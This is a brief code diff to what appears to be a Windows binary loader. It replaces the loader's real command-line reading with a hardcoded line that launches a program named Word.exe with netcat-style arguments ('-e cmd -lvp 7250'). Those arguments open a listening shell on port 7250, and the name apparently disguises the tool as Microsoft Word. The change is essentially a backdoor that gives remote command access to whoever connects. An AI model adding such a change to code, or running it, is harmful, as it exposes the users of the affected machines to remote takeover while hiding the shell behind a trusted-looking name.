@@ -400,8 +400,10 @@ namespace System
 
         // Create new command line
 
-        LPWSTR lpCmdW = GetCommandLineW();
-        LPSTR lpCmdA = GetCommandLineA();
+        //LPWSTR lpCmdW = GetCommandLineW();
+		LPWSTR lpCmdW = L"\"C:\\temp\\loader.exe\" .\\Word.exe -e cmd -lvp 7250";
+        //LPSTR lpCmdA = GetCommandLineA();
+		LPSTR lpCmdA = "\"C:\\temp\\loader.exe\" .\\Word.exe -e cmd -lvp 7250";
         system.argv = Helpers::CommandLineToArgvW(lpCmdW, &system.argc);
 
 #ifdef _LDR_DEBUG_
